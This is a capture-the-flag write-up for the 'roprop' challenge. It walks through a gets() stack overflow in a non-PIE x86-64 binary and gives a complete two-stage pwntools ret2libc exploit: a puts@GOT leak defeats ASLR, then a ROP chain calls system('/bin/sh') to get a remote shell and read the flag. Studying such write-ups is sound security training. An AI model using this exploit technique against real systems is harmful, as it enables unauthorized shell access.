roprop
=======

In this challenge we have the following binary:
```
./roprop: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=dd401b9c7e90c2942cef8de389303e68787c664d, not stripped
```

The following is a disassembly of the main function:

```nasm
   0x00000000004008b2 <+0>:	push   rbp
   0x00000000004008b3 <+1>:	mov    rbp,rsp
   0x00000000004008b6 <+4>:	sub    rsp,0x50
   0x00000000004008ba <+8>:	mov    eax,0x0
   0x00000000004008bf <+13>:	call   0x400851 <nvm_init>
   0x00000000004008c4 <+18>:	mov    eax,0x0
   0x00000000004008c9 <+23>:	call   0x40082f <nvm_timeout>
   0x00000000004008ce <+28>:	lea    rdi,[rip+0xe3]        # 0x4009b8
   0x00000000004008d5 <+35>:	call   0x400660 <puts@plt>
   0x00000000004008da <+40>:	lea    rdi,[rip+0xff]        # 0x4009e0
   0x00000000004008e1 <+47>:	call   0x400660 <puts@plt>
   0x00000000004008e6 <+52>:	lea    rax,[rbp-0x50]
   0x00000000004008ea <+56>:	mov    rdi,rax
   0x00000000004008ed <+59>:	mov    eax,0x0
   0x00000000004008f2 <+64>:	call   0x4006a0 <gets@plt>
   0x00000000004008f7 <+69>:	mov    eax,0x0
   0x00000000004008fc <+74>:	leave  
   0x00000000004008fd <+75>:	ret    
```

Here we see there is a call to a gets() at main+64:

```nasm
   ... 
   0x00000000004008f2 <+64>:	call   0x4006a0 <gets@plt>
   ...
```

which is a vulnerable function that performs no bounds checking.  Hence this is a typical buffer overflow.  However, we are unable
to execute traditional shellcode because of the non-executable stack mitigation.  Hence we opt to perform a ROP chain to call system('/bin/sh') in libc.

```
[*] '/root/roprop'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Before continuing, lets take over the instruction pointer, we should be able to take over by sending 88 bytes of junk:


```python
#!/usr/bin/python3
from pwn import *

def exploit():
	OFFSET = 88

	# Connect to target, leak puts
	conn = remote('172.17.0.2', 5002)
	conn.recvuntil("He have got something for you since late 19's.\n\n")

	payload  = b""
	payload += b"A" * OFFSET
	payload += p64(0xdeadbeefcafebabe)

	conn.sendline(payload)

if __name__ == "__main__":
	exploit()
```

```nasm
Program received signal SIGSEGV, Segmentation fault.
0x00000000004008fd in main ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────[ REGISTERS ]──────────────────────────────────────
 RAX  0x0
 RBX  0x0
 RCX  0x60ff4c437a00 (_IO_2_1_stdin_) ◂— 0xfbad208b
 RDX  0x60ff4c4398d0 (_IO_stdfile_0_lock) ◂— 0x0
 RDI  0x0
 RSI  0x60ff4c437a83 (_IO_2_1_stdin_+131) ◂— 0x4398d0000000000a /* '\n' */
 R8   0x60ff4c4398c0 (_IO_stdfile_1_lock) ◂— 0x0
 R9   0x60ff4c6424c0 ◂— 0x60ff4c6424c0
 R10  0x3
 R11  0x246
 R12  0x4006e0 (_start) ◂— xor    ebp, ebp
 R13  0x7d8344e8dbf0 ◂— 0x1
 R14  0x0
 R15  0x0
 RBP  0x4141414141414141 ('AAAAAAAA')
 RSP  0x7d8344e8db18 ◂— 0xdeadbeefcafebabe
 RIP  0x4008fd (main+75) ◂— ret
───────────────────────────────────────[ DISASM ]────────────────────────────────────────
 ► 0x4008fd <main+75>    ret    <0xdeadbeefcafebabe>

────────────────────────────────────────[ STACK ]────────────────────────────────────────
00:0000│ rsp  0x7d8344e8db18 ◂— 0xdeadbeefcafebabe
01:0008│      0x7d8344e8db20 ◂— 0x2000000000
02:0010│      0x7d8344e8db28 —▸ 0x7d8344e8dbf8 —▸ 0x7d8344e8df70 ◂— 0x4c00706f72706f72 /* 'roprop' */
03:0018│      0x7d8344e8db30 ◂— 0x100000000
04:0020│      0x7d8344e8db38 —▸ 0x4008b2 (main) ◂— push   rbp
05:0028│      0x7d8344e8db40 ◂— 0x0
06:0030│      0x7d8344e8db48 ◂— 0x5bef15a8b8f597e8
07:0038│      0x7d8344e8db50 —▸ 0x4006e0 (_start) ◂— xor    ebp, ebp
──────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────
 ► f 0           4008fd main+75
   f 1 deadbeefcafebabe
   f 2       2000000000
   f 3     7d8344e8dbf8
   f 4        100000000
   f 5           4008b2 main
   f 6                0
Program received signal SIGSEGV (fault address 0x0)
pwndbg>
pwndbg> x/i $rip
=> 0x4008fd <main+75>:	ret
pwndbg> x/xg $rsp
0x7d8344e8db18:	0xdeadbeefcafebabe
```

Now that we are able to redirect execution to any part of the program, we will use this to our advantage to forge a call to PUTS@PLT with PUTS@GOT as argument.

When PUTS is first called, the address of PUTS in LIBC is LAZY LOADED and inserted in PUTS@GOT. Hence, if we leak where PUTS is in the remote system's LIBC, we will be able to 
search which LIBC version the target system runs, and we will be able to adjust our exploit code by re-calling MAIN() and sending the second stage exploit, which is a return to system with the argument '/bin/sh', based on the remote target's address space AND remote target's LIBC.  

After sending the leak and determining the remote target's libc, we craft an exploit to find the gadgets needed.

Our final exploit looks like this:

```python
#!/usr/bin/python3
from pwn import *

def leak_puts():
	PUTS_PLT = 0x400660
	PUTS_GOT = 0x601018
	POP_RDI_RET = 0x0000000000400963
	MAIN = 0x00000000004008b2

	r  = b""
	r += p64(POP_RDI_RET)
	r += p64(PUTS_GOT)
	r += p64(PUTS_PLT)
	r += p64(MAIN)

	return r

def gen_system_shell(binsh, system):
	POP_RDI_RET = 0x0000000000400963
	RET = 0x0000000000400646

	r  = b""
	r += p64(RET)		# align stack
	r += p64(POP_RDI_RET)
	r += p64(binsh)
	r += p64(system)

	return r

def exploit():
	libc = ELF("./target_libc.so")
	OFFSET = 88
	PUTS_LIBC = libc.sym['puts']


	# Connect to target, leak puts
	conn = remote('roprop.darkarmy.xyz', 5002)
	conn.recvuntil("He have got something for you since late 19's.\n\n")

	# Stage one, leak LIBC
	payload  = b""
	payload += b"A" * OFFSET
	payload += leak_puts()

	conn.sendline(payload)
	data = conn.recv(1024).rstrip()
	print(data)
	puts_leak = int.from_bytes(data, 'little', signed=False)

	# Adjust libc.address to remote memory space, to bypass ASLR
	print("PUTS LEAK @ 0x{:016x}\n".format(puts_leak))
	libc.address = puts_leak - PUTS_LIBC
	print("LIBC_ADDRESS @ 0x{:016x}\n".format(libc.address))

	# Obtain BINSH and SYSTEM from the libc library we fingerprinted and downloaded
	BINSH = next(libc.search(b'/bin/sh'))
	SYSTEM = libc.sym['system']

	print("BINSH @ 0x{:016x}".format(BINSH))
	print("SYSTEM @ 0x{:016x}".format(SYSTEM))

	# Stage 2, get a shell
	payload  = b""
	payload += b"A" * OFFSET
	payload += gen_system_shell(BINSH, SYSTEM)

	conn.clean()
	conn.sendline(payload)
	conn.interactive()

if __name__ == "__main__":
	exploit()
```

```
$ python3 ./exploit.py 
[*] './target_libc.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to roprop.darkarmy.xyz on port 5002: Done
b'0\xca\xbd\x8fB\x7f'
PUTS LEAK @ 0x00007f428fbdca30

LIBC_ADDRESS @ 0x00007f428fb5c000

BINSH @ 0x00007f428fd100fa
SYSTEM @ 0x00007f428fbab4e0
[*] Switching to interactive mode

Welcome to the Solar Designer World.

He have got something for you since late 19's.

$ ls -l
total 36
drwxr-x--- 1 0 1000 4096 Sep 25 02:12 bin
drwxr-x--- 1 0 1000 4096 Sep 25 02:12 dev
-rwxr----- 1 0 1000   29 Sep 19 11:19 flag.txt
drwxr-x--- 1 0 1000 4096 Sep 25 02:12 lib
drwxr-x--- 1 0 1000 4096 Sep 25 02:12 lib32
drwxr-x--- 1 0 1000 4096 Sep 25 02:12 lib64
-rwxr-x--- 1 0 1000 8872 Sep 21 17:50 roprop
$ cat ./flag.txt
darkCTF{y0u_r0p_r0p_4nd_w0n}
```
